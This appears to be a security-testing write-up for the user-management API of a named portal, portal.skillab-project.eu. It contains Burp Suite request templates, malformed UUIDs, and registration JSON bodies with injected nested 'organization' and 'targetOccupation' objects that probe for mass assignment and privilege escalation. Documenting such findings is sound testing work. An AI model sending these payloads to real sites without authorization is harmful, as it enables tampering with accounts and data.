# Description
These fuzzing probes target both the GET /user-management/user/{id} and POST /user-management/user endpoints with malformed inputs to uncover improper input handling. The GET fuzz tests broken UUID formats (dash stripping, null bytes, special characters) to trigger information leakage or stack traces. The POST fuzz tests inject unexpected object types into scalar fields (organization and targetOccupation as nested objects with arbitrary id values) to probe for mass assignment, privilege escalation via foreign key manipulation, or server-side deserialization issues — revealing that the backend naively maps user-supplied JSON fields directly into the database model without schema validation.

# Burp Suite GET Request Examples

GET /user-management/user/[FUZZED UUID] HTTP/1.1
Host: portal.skillab-project.eu
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Bearer [VALID JWT TOKEN]
Referer: https://portal.skillab-project.eu/citizen/account
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: keep-alive
Content-Length: 10

Examples of fuzzed UUIDs:

- c99ff294-ee92-42de--8a45-a9860ace32c
- 00000000-0000000--0000-00000-0000000000000
- 00000000-0000000-@-00000-000000000


# Burp Suite Post Request Examples

POST /user-management/user HTTP/1.1
Host: portal.skillab-project.eu
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://portal.skillab-project.eu/register
Content-Type: application/json
Content-Length: 82
Origin: https://portal.skillab-project.eu
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive


Examples of fuzzed Bodies:

{
"id":"test",
"name":"",
"email":"","password":"","address":"","portfolio":""
}


"email" must not be used by somebody

{
"name":"",
"email":"asda",
"password":"",
"address":"",
"portfolio":"",
"organization":"new org"
}

{
"name":"",
"email":"asda","password":"","address":"","portfolio":"",
"organization":{
    "id":1,
    "name":"evil"
    }
}



{
"name":"",
"email":"asda","password":"","address":"","portfolio":"",
"organization":{
    "id":"c99ff294-ee92-42de-8a45-a9860ace32cd",
    "name":"evil"
    }
}


{
"name":"",
"email":"asda","password":"","address":"","portfolio":"",
"targetOccupation":"new targ"
}



{
"name":"",
"email":"asda","password":"","address":"","portfolio":"",
"targetOccupation":{
    "id":"asdasd",
    "value":"evil"
    }
}



{
"name":"",
"email":"asdaasd","password":"","address":"","portfolio":"",
"targetOccupation":{
    "id":"",
    "value":"evil"
    }
}